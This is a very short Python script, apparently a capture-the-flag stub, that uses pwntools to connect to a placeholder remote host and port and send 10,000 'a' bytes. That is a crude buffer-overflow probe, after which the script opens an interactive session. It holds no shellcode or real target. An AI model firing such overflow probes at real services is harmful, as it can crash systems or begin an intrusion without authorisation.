from pwn import *

p = remote('server', 0000)
payload = b'a' * 10000

p.send(payload)
p.interactive()
